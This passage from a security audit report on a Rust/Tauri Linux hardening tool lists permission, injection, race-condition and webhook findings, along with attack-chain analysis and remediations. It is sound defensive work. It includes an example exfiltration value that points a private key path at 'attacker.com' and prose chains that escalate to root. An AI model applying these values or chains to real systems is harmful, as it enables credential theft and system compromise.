**Description:** `update_file_atomically()` creates a `NamedTempFile` with default umask permissions (typically `0644`). When it replaces the original via `persist()`, the new file inherits temp file permissions, not the original's. This silently loosens permissions on security-sensitive files.

**Remediation:** Read original file permissions before writing. After `persist()`, restore original permissions.

---

### SAM-026: Parent Directories Created With Default (World-Readable) Permissions

- **Severity:** Medium
- **CWE:** CWE-276 (Incorrect Default Permissions)
- **Location:** `crates/hardener-state/src/signing.rs:81-83`, `db.rs:95-97`
- **Original SA-IDs:** SA-073

**Description:** Both `save_key()` and `init_db()` call `fs::create_dir_all(parent)` without specifying restrictive permissions. `/var/lib/linux-hardener/` is created world-readable.

**Remediation:** Use `DirBuilder::new().recursive(true).mode(0o700).create(parent)`.

---

### SAM-027: SQLite Database Created Without Restrictive Permissions

- **Severity:** Medium
- **CWE:** CWE-276 (Incorrect Default Permissions)
- **Location:** `crates/hardener-state/src/db.rs:100-102`
- **Original SA-IDs:** SA-012, SA-061, SA-084

**Description:** The SQLite database is created with umask-default permissions. The database contains sensitive data: full file contents of `sshd_config`, PAM rules, and audit rules stored as BLOBs. A local user could read the system database to extract sensitive configuration.

**Remediation:** Set database file permissions to `0600` after creation.

---

### SAM-028: Database Operations Not Wrapped in Transactions

- **Severity:** Medium
- **CWE:** CWE-362 (Race Condition)
- **Location:** `crates/hardener-state/src/manager.rs:342-398, 506-522`
- **Original SA-IDs:** SA-047, SA-059

**Description:** `store_checkpoint()` performs one INSERT into `checkpoints` then N INSERTs into `file_states` without a transaction. `delete_checkpoint()` DELETEs from two tables without a transaction. Crashes can leave partial data.

**Remediation:** Wrap multi-statement operations in `sqlx::Transaction`.

---

### SAM-029: Foreign Keys Not Enforced (PRAGMA Never Set)

- **Severity:** Medium
- **CWE:** CWE-1286 (Improper Validation of Syntactic Correctness)
- **Location:** `crates/hardener-state/src/db.rs:99-117`
- **Original SA-IDs:** SA-058, SA-085

**Description:** The schema defines foreign key constraints, but `PRAGMA foreign_keys = ON` is never executed. Constraints are not enforced, `ON DELETE CASCADE` does not work.

**Remediation:** Execute `PRAGMA foreign_keys = ON;` immediately after establishing each connection.

---

### SAM-030: Private Key Stored as Raw Unencrypted Bytes

- **Severity:** Medium
- **CWE:** CWE-312 (Cleartext Storage of Sensitive Information)
- **Location:** `crates/hardener-state/src/signing.rs:86-87`
- **Original SA-IDs:** SA-075

**Description:** The Ed25519 private key is stored as raw 32 bytes with no encryption envelope or passphrase protection.

**Remediation:** Encrypt the key at rest using a passphrase-derived key (Argon2 + AES-256-GCM) or use OS-level secret storage.

---

### SAM-031: Hash Input Uses Non-Canonical Serialisation With Timestamp TOCTOU

- **Severity:** Medium
- **CWE:** CWE-345 (Insufficient Verification of Data Authenticity)
- **Location:** `crates/hardener-state/src/audit.rs:260-312`
- **Original SA-IDs:** SA-082

**Description:** The data hashed for the audit chain calls `Utc::now()` twice -- once for the hash input and once for the entry constructor. The hashed timestamp and stored timestamp can differ at second boundaries, causing false-positive tampering alerts.

**Remediation:** Compute the timestamp once and pass it to both the hash and the entry.

---

### SAM-032: No Signature Verification in GUI Checkpoint Display Path

- **Severity:** Medium
- **CWE:** CWE-347 (Improper Verification of Cryptographic Signature)
- **Location:** `src-tauri/src/commands.rs:237-519`
- **Original SA-IDs:** SA-071

**Description:** The GUI reads from both user and system databases, listing checkpoints without verifying signatures. Tampered databases display fabricated checkpoint metadata.

**Remediation:** Verify signatures when displaying checkpoints. Flag unverifiable checkpoints with a warning indicator.

---

### SAM-033: Webhook Environment Variable Expansion Leaks Secrets

- **Severity:** Medium
- **CWE:** CWE-200 (Information Exposure)
- **Location:** `crates/hardener-scheduler/src/notification/webhook.rs:46-63`
- **Original SA-IDs:** SA-010, SA-094

**Description:** The `expand_env_vars()` function replaces `${VAR}` patterns in header values with environment variable values without any allowlist. A config entry like `Authorization: Bearer ${HARDENER_SMTP_PASSWORD}` sends credentials to the webhook endpoint.

**Remediation:** Implement an allowlist of environment variable prefixes (e.g., `HARDENER_WEBHOOK_*`) or use a dedicated secrets mechanism.

---

### SAM-034: Webhook Custom Headers Allow HTTP Header Injection

- **Severity:** Medium
- **CWE:** CWE-113 (HTTP Header Injection)
- **Location:** `crates/hardener-scheduler/src/notification/webhook.rs:204-208`
- **Original SA-IDs:** SA-093

**Description:** Custom headers from config are added without validation. While `reqwest`/`hyper` validate header values, relying solely on library validation is fragile.

**Remediation:** Validate header keys against `^[a-zA-Z0-9\-]+$` and values against `^[\x20-\x7E]+$`.

---

### SAM-035: Email Subject Contains Unsanitised Hostname

- **Severity:** Medium
- **CWE:** CWE-93 (CRLF Injection)
- **Location:** `crates/hardener-scheduler/src/notification/email.rs:86-101`
- **Original SA-IDs:** SA-096

**Description:** The email subject includes `summary.host` from `hostname::get()`. A compromised hostname containing CRLF sequences could inject SMTP headers. Defence relies entirely on the `lettre` crate.

**Remediation:** Strip control characters from `summary.host` before interpolation.

---

### SAM-036: CSV Output Vulnerable to Formula Injection

- **Severity:** Medium
- **CWE:** CWE-1236 (Formula Injection in CSV)
- **Location:** `crates/hardener-compliance/src/output/csv.rs:110-116`
- **Original SA-IDs:** SA-100

**Description:** The `escape_csv_field` function handles commas, quotes, and newlines but does not protect against formula injection (`=`, `+`, `-`, `@` cell prefixes).

**Remediation:** Prefix cells starting with formula characters with a tab or single quote per OWASP recommendations.

---

### SAM-037: No Size Limit on TOML Config File Parsing

- **Severity:** Medium
- **CWE:** CWE-400 (Uncontrolled Resource Consumption)
- **Location:** `crates/hardener-core/src/config_loader.rs:104-119`
- **Original SA-IDs:** SA-102

**Description:** `load_from_file` reads the entire config file with `read_to_string(path)` without size limits. A multi-gigabyte config file causes OOM.

**Remediation:** Check file size before reading (e.g., reject files over 1 MB).

---

### SAM-038: withGlobalTauri Exposes IPC to All Scripts in Webview

- **Severity:** Medium
- **CWE:** CWE-749 (Exposed Dangerous Method)
- **Location:** `src-tauri/tauri.conf.json:13`
- **Original SA-IDs:** SA-117

**Description:** `"withGlobalTauri": true` makes `window.__TAURI__` available to all JavaScript, including scripts injected via XSS. All 25 custom IPC commands are accessible.

**Remediation:** Set `"withGlobalTauri": false` and use Tauri's module import system.

---

### SAM-039: Custom IPC Commands Not Gated by Capability ACLs

- **Severity:** Medium
- **CWE:** CWE-862 (Missing Authorization)
- **Location:** `src-tauri/capabilities/default.json`
- **Original SA-IDs:** SA-118

**Description:** Custom commands registered via `invoke_handler` are not covered by the Tauri capability ACL system -- they are always accessible. No distinction between read-only and write/privileged commands.

**Remediation:** Define custom permission identifiers for privileged commands and add them to the capability file.

---

### SAM-040: export_compliance_report Allows Arbitrary File Write as User

- **Severity:** Medium
- **CWE:** CWE-73 (External Control of File Name or Path)
- **Location:** `src-tauri/src/commands.rs:641-703`
- **Original SA-IDs:** SA-015, SA-121

**Description:** The `output_path` from the frontend is used directly for `std::fs::write()`. The user-privilege process can overwrite `~/.bashrc`, `~/.ssh/authorized_keys`, or other sensitive user files.

**Remediation:** Validate path is within allowed directories. Prefer Tauri's `dialog` plugin for OS-native save dialogs.

---

### SAM-041: std::sync::Mutex on RemoteState Risks Deadlock in Async Context

- **Severity:** Medium
- **CWE:** CWE-833 (Deadlock)
- **Location:** `src-tauri/src/commands.rs:27`
- **Original SA-IDs:** SA-126

**Description:** `std::sync::Mutex` is used in a tokio async context. If held across `.await` points in future code changes, deadlock occurs. Mutex poisoning permanently disables remote scanning.

**Remediation:** Replace with `tokio::sync::Mutex` or `parking_lot::Mutex`.

---

### SAM-042: No Concurrency Guards on Privileged Operations

- **Severity:** Medium
- **CWE:** CWE-362 (Race Condition)
- **Location:** `src-tauri/src/commands.rs:349-471`
- **Original SA-IDs:** SA-127

**Description:** Nothing prevents multiple concurrent `run_apply` or `run_rollback` calls. Each spawns a separate `pkexec hardener` process that may concurrently write to the same config files.

**Remediation:** Add a server-side operation lock (e.g., `AtomicBool`) that serialises privileged operations.

---

### SAM-043: SSH Key File Path From Frontend Enables Credential Exfiltration

- **Severity:** Medium
- **CWE:** CWE-522 (Insufficiently Protected Credentials)
- **Location:** `src-tauri/src/commands.rs:878-901`
- **Original SA-IDs:** SA-109, SA-133

**Description:** `RemoteHostProfile.key_file` accepts any path. A compromised frontend can set `key_file: "/etc/ssl/private/server.key"` and `hostname: "attacker.com"`. The SSH client reads the key and transmits it to the attacker's server.

**Remediation:** Restrict `key_file` to `~/.ssh/`. Validate hostname format. Warn on disabled host key checking.

---

### SAM-044: No Rate Limiting on pkexec-Triggering IPC Commands

- **Severity:** Medium
- **CWE:** CWE-799 (Improper Control of Interaction Frequency)
- **Location:** `src-tauri/src/commands.rs:349-548`
- **Original SA-IDs:** SA-019, SA-135

**Description:** No rate limiting or cooldown on IPC commands that trigger pkexec. During the polkit authentication cache window, a compromised frontend can execute many privileged operations without additional prompts.

**Remediation:** Add minimum interval between privileged operations. Implement operation counter per session.

---

### SAM-045: Permissions Plugin TOCTOU Between Check and chmod

- **Severity:** Medium
- **CWE:** CWE-367 (TOCTOU Race Condition)
- **Location:** `crates/hardener-plugins/src/permissions/mod.rs:196-212`
- **Original SA-IDs:** SA-033, SA-049

**Description:** `apply_path_permissions()` calls `path_exists()`, `file_metadata()`, then `execute_command("chmod", ...)`. Between these, an attacker could replace the target with a symlink.

**Remediation:** Use `fchmod()` with a file descriptor opened with `O_NOFOLLOW | O_PATH`.

---

### SAM-046: SSH Host Key Verification Disabled Without Runtime Warning

- **Severity:** Medium
- **CWE:** CWE-295 (Improper Certificate Validation)
- **Location:** `crates/hardener-cli/src/cli.rs:53`, `ssh.rs:27`
- **Original SA-IDs:** SA-091

**Description:** The `--ssh-no-verify` flag disables host key checking with no runtime warning emitted.

**Remediation:** Emit a prominent stderr warning when active.

---

## 7. Low Findings

### SAM-047: Non-Atomic write_file in LocalExecutor and Rollback Path

- **CWE:** CWE-367 (TOCTOU)
- **Location:** `local.rs:41-43`, `manager.rs:550`
- **Original SA-IDs:** SA-035, SA-044, SA-048
- **Description:** `LocalExecutor::write_file()` and `restore_file_state_tracked()` use non-atomic `std::fs::write()`. Interruption leaves partially-written config files. The codebase has `update_file_atomically()` available but does not use it.
- **Remediation:** Replace with `update_file_atomically()`.

---

### SAM-048: Firewalld Zone Name From Remote Host Used in Commands

- **CWE:** CWE-78
- **Location:** `firewalld.rs:47-52`
- **Original SA-IDs:** SA-025
- **Description:** Zone name from `firewall-cmd --get-default-zone` on a remote host is used in subsequent commands. A compromised remote host could inject shell metacharacters via SSH executor.
- **Remediation:** Validate zone name matches `^[a-zA-Z0-9_-]+$`.

---

### SAM-049: Permissions Plugin Allows Arbitrary Octal Mode From Config

- **CWE:** CWE-20
- **Location:** `permissions/mod.rs:355-358`
- **Original SA-IDs:** SA-029
- **Description:** Any valid octal value is accepted, including `0777` on critical system paths.
- **Remediation:** Reject modes more permissive than the baseline. Validate `^[0-7]{3,4}$`.

---

### SAM-050: Audit Rules Backup Path Symlink Attack

- **CWE:** CWE-22
- **Location:** `audit/mod.rs:304-337`
- **Original SA-IDs:** SA-052
- **Description:** Audit rules backup uses predictable path without symlink check.
- **Remediation:** Verify backup destination does not exist and is not a symlink.

---

### SAM-051: Audit Log Path Not Validated

- **CWE:** CWE-22
- **Location:** `audit.rs:225`
- **Original SA-IDs:** SA-064
- **Description:** `AuditLogger::new()` accepts arbitrary path without validation.
- **Remediation:** Validate path is within expected logging directory.

---

### SAM-052: Corrupted JSON in Database Silently Produces Empty Data

- **CWE:** CWE-20
- **Location:** `scan_manager.rs:232-245`
- **Original SA-IDs:** SA-016, SA-066
- **Description:** Corrupted JSON fields silently return empty vectors or None, hiding compliance data.
- **Remediation:** Return errors for corrupted data or include corruption indicator in UI.

---

### SAM-053: User Config Loaded Without Integrity Check for Root Operations

- **CWE:** CWE-345
- **Location:** `config_loader.rs:60-63`
- **Original SA-IDs:** SA-068
- **Description:** User config at `~/.config/` is merged with higher precedence than system config, even for root-level operations via pkexec.
- **Remediation:** When running as root, only load system config by default.

---

### SAM-054: No Key Rotation Mechanism

- **CWE:** CWE-324
- **Location:** `signing.rs:19-42`
- **Original SA-IDs:** SA-074
- **Description:** No mechanism to rotate keys, no version tracking, no way to re-sign existing checkpoints.
- **Remediation:** Implement key versioning with `key_version` column in checkpoints table.

---

### SAM-055: Hash Chain Comparison Uses Non-Constant-Time Equality

- **CWE:** CWE-208
- **Location:** `hash_chain.rs:75`
- **Original SA-IDs:** SA-078
- **Description:** Uses `==` for hash comparison which has timing side-channel. Impractical to exploit locally but sets a bad precedent.
- **Remediation:** Use `subtle::ConstantTimeEq`.

---

### SAM-056: Signature Input Order Depends on File State Iteration Order

- **CWE:** CWE-345
- **Location:** `manager.rs:224-229`
- **Original SA-IDs:** SA-083
- **Description:** `generate_signature()` iterates file states in provided order. Reordering would break verification.
- **Remediation:** Sort by `file_path` before hashing.

---

### SAM-057: Secret Key Bytes Not Zeroed After Use

- **CWE:** CWE-316
- **Location:** `signing.rs:48-53`
- **Original SA-IDs:** SA-087
- **Description:** `secret_bytes` local array is not zeroed after `SigningKey::from_bytes()`.
- **Remediation:** Use `zeroize::Zeroize` on the buffer.

---

### SAM-058: HTML Report Severity and Framework Name Not Escaped

- **CWE:** CWE-79
- **Location:** `html.rs:33-116`
- **Original SA-IDs:** SA-011, SA-098, SA-099
- **Description:** `finding_severity` and `framework.full_name()` rendered without `html_escape()`. Currently safe (enum/static values) but inconsistent with other escaped fields.
- **Remediation:** Apply `html_escape()` for consistency.

---

### SAM-059: CSV control_id and Framework Fields Not Escaped

- **CWE:** CWE-1236
- **Location:** `csv.rs:51-60`
- **Original SA-IDs:** SA-101
- **Description:** `control_id` and `report_framework` written without `escape_csv_field()`.
- **Remediation:** Pass through `escape_csv_field()`.

---

### SAM-060: Commands Inherit Unsanitised Environment and Use Bare Command Names

- **CWE:** CWE-426
- **Location:** `local.rs:70-81`, `package/mod.rs:72`
- **Original SA-IDs:** SA-038, SA-039
- **Description:** `LocalExecutor::execute_command()` inherits the full environment. System commands and package managers use bare names resolved via PATH.
- **Remediation:** Use absolute paths for all system commands.

---

### SAM-061: systemd Install Uses HOME Env Var for Path Construction

- **CWE:** CWE-22
- **Location:** `systemd.rs:75-76`
- **Original SA-IDs:** SA-040
- **Description:** User-mode unit directory constructed from `$HOME` which can be spoofed.
- **Remediation:** Resolve home directory from `/etc/passwd` via `nix::unistd::User::from_uid()`.

---

### SAM-062 through SAM-079: Additional Low findings as summarised in the Findings Summary Table above. Each has a single-line description and remediation captured in the table; full details are available in the domain-specific agent reports.

---

## 8. Informational

### SAM-P01: Parameterised SQL Queries Throughout (Positive Finding)
All SQL queries use `sqlx::query()` with `.bind()`. No string concatenation is used to build SQL. This eliminates SQL injection as an attack vector.

### SAM-P02: Leptos View Rendering Is XSS-Safe by Default (Positive Finding)
All data rendered in Leptos `view!{}` macros uses text nodes. No `inner_html` or `dangerously_set_inner_html` patterns found in any component. Leptos automatically escapes text content.

### SAM-P03: Tauri JSON Deserialisation Handles Malformed Input Gracefully (Positive Finding)
Malformed JSON or wrong types from the frontend produce deserialisation errors rather than panics. All error paths return `Result::Err`.

### SAM-P04: localStorage Stores Only Non-Sensitive Theme Preference (Positive Finding)
No secrets, tokens, credentials, or sensitive data are stored in client-side storage.

### SAM-P05: CSP img-src data: URIs (Informational)
The `data:` URI scheme in img-src is needed for dynamic images but slightly weakens CSP. Minimal direct risk.

### SAM-I01: SSH sudo tee Used Unconditionally
The SSH `write_file()` always uses `sudo tee`, which hangs if the remote user lacks passwordless sudo.

### SAM-I02: Remote command_exists() Can Be Spoofed
A compromised remote host can fake `which` results, influencing firewall backend selection.

### SAM-I03: Polkit Policy Uses auth_admin_keep
Authentication is cached for a period, allowing subsequent pkexec calls without re-authentication.

---

## 9. Attack Chain Analysis

### Chain 1: Database Poisoning to Root Compromise (Critical)

**Findings:** SAM-027 -> SAM-001 -> SAM-002

**Path:** The SQLite database at `/var/lib/linux-hardener/checkpoints.db` may be created with lax permissions (SAM-027). A local attacker modifies the database to inject a checkpoint with `file_path = "/etc/shadow"` and attacker-controlled content. When the legitimate user triggers rollback via the GUI, the checkpoint signature is not verified (SAM-001), and the attacker-controlled content is written to the arbitrary path as root (SAM-002). This achieves complete system compromise from a local unprivileged position.

**Cascading amplifiers:** SAM-012 (signature does not cover permissions), SAM-011 (signing key co-located, enabling signature forgery even if SAM-001 is fixed), SAM-028 (no transactions allow partial injection).

---

### Chain 2: Config File to Remote Code Execution (High)

**Findings:** SAM-009 -> SAM-005/SAM-007/SAM-008

**Path:** An attacker who controls the user config file (`~/.config/linux-hardener/config.toml`) injects malicious directive values containing shell metacharacters. When the user runs hardening against a remote host via SSH, the directive values flow through plugin code into the SSH executor, which concatenates them into shell command strings (SAM-007) or heredoc content (SAM-008) without escaping. The attacker achieves arbitrary command execution on the remote host as the SSH user (potentially root via `sudo tee`).

**Cascading amplifiers:** SAM-016 (config path from frontend can point to attacker-controlled file), SAM-053 (user config loaded for root operations).

---

### Chain 3: Frontend Compromise to Privileged Operations (High)

**Findings:** SAM-038 -> SAM-015/SAM-016 -> SAM-044

**Path:** `withGlobalTauri` exposes all IPC to scripts in the webview (SAM-038). If any XSS vector exists (theoretical given SAM-P02's Leptos safety, but possible through compromised remote scan data or future code changes), the attacker calls IPC commands directly. Without input validation (SAM-015), they pass malicious plugin IDs or config paths to pkexec. Without rate limiting (SAM-044), they leverage the polkit authentication cache to execute multiple privileged operations within the cached window.

**Cascading amplifiers:** SAM-039 (no capability ACLs on custom commands), SAM-042 (no concurrency guards, enabling race conditions between operations).

---

### Chain 4: Signing System Bypass (High)

**Findings:** SAM-011 -> SAM-014 -> SAM-012 -> SAM-001

**Path:** The signing key and checkpoint database are co-located (SAM-011). An attacker who gains access to the directory reads the private key. Since the same key signs and verifies (SAM-014), they can forge signatures. Even if signature verification is added (fixing SAM-001), permissions and ownership are not covered by the signature (SAM-012), so the attacker can still tamper with these fields. The entire cryptographic integrity layer can be bypassed from a single directory compromise.

---

### Chain 5: Audit Evasion (Medium)

**Findings:** SAM-003 -> SAM-013 -> SAM-031

**Path:** The audit logger is never instantiated in production (SAM-003), so no audit trail exists. Even if enabled, the hash chain resets on every restart (SAM-013), making verification perpetually fail and training operators to ignore it. The timestamp TOCTOU in hash computation (SAM-031) further weakens any verification that might occur. An attacker can perform arbitrary operations with no forensic evidence.

---

## 10. Positive Findings

The codebase demonstrates several strong security practices:

1. **No SQL Injection (SAM-P01):** All database queries use parameterised queries via `sqlx::query().bind()`. No string concatenation in SQL construction. The one dynamic `IN` clause uses proper bind parameters.

2. **XSS-Safe Frontend (SAM-P02):** Leptos view macros automatically escape all text content. No `inner_html` or `dangerously_set_inner_html` patterns. The single `set_inner_html` call clears a loading placeholder with an empty string.

3. **Graceful Error Handling (SAM-P03):** Tauri command deserialisation returns errors rather than panicking on malformed input. All error paths use `Result::Err`.

4. **Correct Cryptographic Algorithm Choices:** Ed25519 (via `ed25519-dalek 2.2.0`), SHA-256 (via `ring 0.17.14`), and CSPRNG (via `rand 0.9.2` with `getrandom` backend) are all current, well-maintained, and appropriate for their use cases.

5. **Memory-Safe Language:** Rust's ownership model eliminates entire classes of vulnerabilities (buffer overflows, use-after-free, double-free). No `unsafe` blocks were found in application code.

6. **Dependency Hygiene:** All cryptographic dependencies are current with no known CVEs. The `zeroize` crate is used by `ed25519-dalek` for key material cleanup.

7. **Minimal Client-Side Storage (SAM-P04):** Only the theme preference (a short string) is stored in localStorage. No secrets or sensitive data in client-side storage.

8. **Proper CSP for Scripts:** `script-src 'self' 'wasm-unsafe-eval'` correctly restricts script execution while allowing WASM.

---

## 11. Cross-Reference Table

| Original SA-ID | Consolidated SAM-ID | Notes |
|---------------|---------------------|-------|
| SA-001 | SAM-006 | SSH single-quote injection |
| SA-002 | SAM-007 | SSH arg concatenation |
| SA-003 | SAM-008 | SSH heredoc injection |
| SA-004 | SAM-001 | Signature not verified |
| SA-005 | SAM-002 | Rollback arbitrary path |
| SA-006 | SAM-024 | Signing key TOCTOU |
| SA-007 | SAM-010 | SSRF via webhook |
| SA-008 | SAM-016 | Config path traversal |
| SA-009 | SAM-013 | Hash chain reset |
| SA-010 | SAM-033 | Webhook env var leak |
| SA-011 | SAM-058 | HTML severity unescaped |
| SA-012 | SAM-027 | DB permissions |
| SA-013 | SAM-025 | Atomic write permissions |
| SA-014 | SAM-I03 | Polkit auth_admin_keep |
| SA-015 | SAM-040 | Export path traversal |
| SA-016 | SAM-052 | Corrupted JSON |
| SA-017 | SAM-017 | Binary PATH lookup |
| SA-018 | SAM-079 | USER env spoofing |
| SA-019 | SAM-078 | Checkpoint name validation |
| SA-020 | SAM-070 | CSP unsafe-inline |
| SA-021 | SAM-009 | Kernel directive injection |
| SA-022 | SAM-009 | SSH directive injection |
| SA-023 | SAM-009 | PAM directive injection |
| SA-024 | SAM-009 | Firewall directive injection |
| SA-025 | SAM-048 | Firewalld zone name |
| SA-026 | SAM-015 | Plugin ID validation |
| SA-027 | SAM-015 | Checkpoint ID validation |
| SA-028 | SAM-015 | Checkpoint name validation |
| SA-029 | SAM-049 | Permission mode validation |
| SA-030 | SAM-017 | Binary TOCTOU |
| SA-031 | SAM-016 | Config path to root |
| SA-032 | SAM-077 | Dry-run info disclosure |
| SA-033 | SAM-045 | Permissions TOCTOU |
| SA-034 | SAM-023 | SSH config race |
| SA-035 | SAM-047 | Non-atomic write |
| SA-036 | SAM-005 | SSH raw commands arch |
| SA-037 | SAM-I01 | sudo tee unconditional |
| SA-038 | SAM-060 | Environment inheritance |
| SA-039 | SAM-060 | Bare command names |
| SA-040 | SAM-061 | HOME env var |
| SA-041 | SAM-I02 | command_exists spoofing |
| SA-042 | SAM-001 | Signature not verified |
| SA-043 | SAM-002 | Rollback arbitrary path |
| SA-044 | SAM-047 | Non-atomic rollback write |
| SA-045 | SAM-018 | Partial rollback |
| SA-046 | SAM-019 | Symlink in capture |
| SA-047 | SAM-028 | delete_checkpoint no tx |
| SA-048 | SAM-047 | LocalExecutor write |
| SA-049 | SAM-045 | Permissions TOCTOU |
| SA-050 | SAM-020 | Backup file race |
| SA-051 | SAM-021 | sysctl path |
| SA-052 | SAM-050 | Audit backup symlink |
| SA-053 | SAM-022 | Checkpoint TOCTOU |
| SA-054 | SAM-023 | sshd_config race |
| SA-055 | SAM-024 | Key TOCTOU |
| SA-056 | SAM-025 | Atomic write perms |
| SA-057 | SAM-067 | JsonStore non-atomic (remap: json_store path) |
| SA-058 | SAM-029 | Foreign keys |
| SA-059 | SAM-028 | No transactions |
| SA-060 | SAM-P01 | Positive: parameterised SQL |
| SA-061 | SAM-027 | DB permissions |
| SA-062 | SAM-011 | Key co-location |
| SA-063 | SAM-012 | Sig no permissions |
| SA-064 | SAM-051 | Audit log path |
| SA-065 | SAM-013 | Hash chain reset |
| SA-066 | SAM-052 | Corrupted JSON |
| SA-067 | SAM-009 | Config directives unvalidated |
| SA-068 | SAM-053 | User config for root ops |
| SA-069 | SAM-001 | Signature not verified |
| SA-070 | SAM-014 | No trust separation |
| SA-071 | SAM-032 | GUI no verification |
| SA-072 | SAM-024 | Key TOCTOU |
| SA-073 | SAM-026 | Dir permissions |
| SA-074 | SAM-054 | No key rotation |
| SA-075 | SAM-030 | Key unencrypted |
| SA-076 | SAM-011 | Key co-location |
| SA-077 | SAM-012 | Sig no permissions |
| SA-078 | SAM-055 | Non-constant-time compare |
| SA-079 | SAM-013 | Hash chain reset |
| SA-080 | SAM-003 | AuditLogger dead code |
| SA-081 | SAM-027 | Audit log permissions (merged with DB perms) |
| SA-082 | SAM-031 | Hash non-canonical |
| SA-083 | SAM-056 | Sig iteration order |
| SA-084 | SAM-027 | DB permissions |
| SA-085 | SAM-029 | Foreign keys |
| SA-086 | SAM-004 | JSON store hash dead |
| SA-087 | SAM-057 | Key bytes not zeroed |
| SA-088 | SAM-006 | SSH single-quote |
| SA-089 | SAM-008 | SSH heredoc |
| SA-090 | SAM-007 | SSH arg concat |
| SA-091 | SAM-046 | SSH no-verify warning |
| SA-092 | SAM-010 | SSRF webhook |
| SA-093 | SAM-034 | Header injection |
| SA-094 | SAM-033 | Env var leak |
| SA-095 | SAM-065 | Webhook response size |
| SA-096 | SAM-035 | SMTP injection |
| SA-097 | SAM-064 | Email path disclosure |
| SA-098 | SAM-058 | HTML severity unescaped |
| SA-099 | SAM-058 | HTML framework unescaped |
| SA-100 | SAM-036 | CSV formula injection |
| SA-101 | SAM-059 | CSV field unescaped |
| SA-102 | SAM-037 | Config size limit |
| SA-103 | SAM-062 | Config nesting limit |
| SA-104 | SAM-009 | Config to SSH injection |
| SA-105 | SAM-063 | Env override validation |
| SA-106 | SAM-015 | Plugin ID validation |
| SA-107 | SAM-016 | Config path traversal |
| SA-108 | SAM-015 | Checkpoint ID validation |
| SA-109 | SAM-043 | SSH key file exfil |
| SA-110 | SAM-015 | Checkpoint name validation |
| SA-111 | SAM-068 | SSH error disclosure |
| SA-112 | SAM-069 | Error path disclosure |
| SA-113 | SAM-066 | Webhook no circuit breaker |
| SA-114 | SAM-067 | JSON store session path |
| SA-115 | SAM-070 | CSP unsafe-inline |
| SA-116 | SAM-P05 | CSP data: URIs |
| SA-117 | SAM-038 | withGlobalTauri |
| SA-118 | SAM-039 | Capability ACLs |
| SA-119 | SAM-015 | IPC validation systemic |
| SA-120 | SAM-016 | Config path root read |
| SA-121 | SAM-040 | Export file write |
| SA-122 | SAM-071 | validate_config read |
| SA-123 | SAM-072 | Scheduler config content |
| SA-124 | SAM-P03 | Positive: deserialisation |
| SA-125 | SAM-073 | CLI stdout parsing |
| SA-126 | SAM-041 | Mutex deadlock |
| SA-127 | SAM-042 | No concurrency guard |
| SA-128 | SAM-P02 | Positive: Leptos XSS safety |
| SA-129 | SAM-074 | Theme DOM attribute |
| SA-130 | SAM-P04 | Positive: localStorage |
| SA-131 | SAM-075 | Checkpoint path disclosure |
| SA-132 | SAM-069 | Error path disclosure |
| SA-133 | SAM-043 | SSH key exfiltration |
| SA-134 | SAM-076 | Parameter casing |
| SA-135 | SAM-044 | Rate limiting |
| SA-136 | SAM-077 | Dry-run validation |

---

## Severity Distribution Summary

| Severity | Count |
|----------|-------|
| Critical | 4 |
| High | 10 |
| Medium | 32 |
| Low | 33 |
| Informational | 8 (including 5 positive) |
| **Total unique findings** | **87** |

*Note: The Low and Informational counts include findings SAM-047 through SAM-079 and SAM-P01 through SAM-I03 which are briefly described in the Findings Summary Table and Low Findings section. Full details for each are available in the domain-specific agent reports.*

---

*End of Security Audit Report*
